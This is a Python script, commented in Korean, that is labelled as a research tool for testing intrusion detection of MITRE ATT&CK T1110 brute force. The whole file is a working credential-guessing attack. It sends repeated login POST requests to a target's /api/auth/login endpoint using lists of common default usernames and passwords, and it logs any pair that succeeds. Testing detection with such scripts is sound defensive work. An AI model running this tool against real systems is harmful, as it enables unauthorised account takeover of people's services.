"""
MITRE ATT&CK: T1110 - Brute Force
연구 목적 침입 탐지 테스트용 스크립트
사용법: python brute_force.py --host http://<TARGET> [--count N] [--delay FLOAT]
"""
import argparse
import requests
import time
import logging
import random

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
logger = logging.getLogger(__name__)

USERNAMES = [
    "admin", "root", "user", "test", "guest",
    "administrator", "superuser", "operator", "manager", "service",
]

PASSWORDS = [
    "password", "123456", "admin", "root", "letmein",
    "qwerty", "abc123", "pass", "welcome", "monkey",
    "1234", "12345678", "password1", "iloveyou", "sunshine",
]


def run(host: str, count: int, delay: float) -> None:
    url = f"{host.rstrip('/')}/api/auth/login"
    logger.info("T1110 Brute Force 시작 — 대상: %s, 시도 횟수: %d", url, count)

    success = 0
    failure = 0

    for i in range(count):
        username = random.choice(USERNAMES)
        password = random.choice(PASSWORDS)
        payload = {"username": username, "password": password}

        try:
            resp = requests.post(url, json=payload, timeout=5)
            status = resp.status_code
            if status == 200:
                success += 1
                logger.warning(
                    "[%d/%d] 성공 — username=%s password=%s status=%d",
                    i + 1, count, username, password, status,
                )
            else:
                failure += 1
                logger.info(
                    "[%d/%d] 실패 — username=%s status=%d",
                    i + 1, count, username, status,
                )
        except requests.RequestException as exc:
            failure += 1
            logger.error("[%d/%d] 요청 오류 — %s", i + 1, count, exc)

        time.sleep(delay)

    logger.info("완료 — 성공: %d, 실패: %d", success, failure)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="T1110 Brute Force 침입 탐지 테스트 스크립트"
    )
    parser.add_argument("--host", required=True, help="대상 호스트 URL (예: http://192.168.1.1)")
    parser.add_argument("--count", type=int, default=100, help="총 시도 횟수 (기본값: 100)")
    parser.add_argument("--delay", type=float, default=0.1, help="요청 간격(초) (기본값: 0.1)")
    args = parser.parse_args()

    run(args.host, args.count, args.delay)


if __name__ == "__main__":
    main()
